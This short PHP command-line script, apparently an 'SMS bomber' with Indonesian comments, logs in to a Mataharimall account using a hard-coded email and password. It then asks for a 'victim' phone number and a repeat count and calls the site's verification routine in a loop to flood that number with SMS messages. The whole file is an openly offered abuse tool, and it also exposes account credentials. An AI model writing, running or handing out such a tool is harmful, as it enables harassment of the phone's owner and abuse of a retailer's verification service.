<?php

//MADE BY YUKKI666
//https://github.com/mryukk11
//GARUDA TERSAKTI 72

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "tetew04@gmail.com";
$init->pass = "GARUDA72";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
echo "Nomor Korban (pakai 62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Santet\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
